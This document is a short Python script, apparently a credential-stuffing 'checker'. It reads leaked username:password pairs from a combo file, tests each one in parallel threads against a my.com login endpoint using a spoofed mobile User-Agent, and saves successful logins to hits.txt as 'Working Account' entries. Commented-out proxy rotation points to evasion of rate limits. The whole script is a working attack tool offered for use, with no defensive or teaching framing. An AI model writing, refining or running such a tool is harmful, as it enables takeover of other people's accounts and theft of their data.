import requests
import threading
import time
import sys
deger2 = 0
koko = ""
from discord_webhook import DiscordWebhook
def combo():

        combos = open(sys.argv[1], encoding='utf8', errors = 'ignore').readlines()
        User = []
        Pass = []
        for y in combos:
            ez = y.replace("\n", "").split(":")
            try:
                User.append(ez[0])
                Pass.append(ez[1])
            except:
                pass
        return User,Pass






def crack(User1,Pass1):
  global deger2
  try:

            url1 = f"https://aj-https.my.com/cgi-bin/auth?model=&simple=1&Login={User1}&Password={Pass1}"
            headers = {
              "User-Agent": "MyCom/12436 CFNetwork/758.2.8 Darwin/15.0.0"
          }
            f = requests.get(url1, headers=headers)
            if "Ok=1" in f.text:
              file1 = open("hits.txt", "a")  # append mode
              file1.write("Working Account: "+ User1 + ":"+ Pass1 + "\n")
              file1.close()
            elif "Ok=0" in f.text:
              
              print("fail ")
            else:
              
              print("fail ")
  except:
    crack(User1,Pass1)
deger = 0

def başlatıcı():
    num=int('0')
    User,Pass=combo()
    threadsnum = sys.argv[2]
    while 1:
        if threading.active_count() < int(threadsnum):
                if len(User) > num:
     #                   randomproxy = proxys3[random.randint(1,len(proxys3))]
     #                   proxsel = {
     #                       'http': 'http://'+randomproxy,
     #                       'https': 'https://'+randomproxy
     #                       }
                    threading.Thread(target=crack, args=(User[num], Pass[num])).start()
                    num += 1
                    #print('Taranmamış user sayısı=',kalan)
                    #kalan -= 1
                else:
                    exit()
            
                    
                    time.sleep(0.6)
                    
        else:
            #print("Checking done!")
            time.sleep(0.3)
başlatıcı()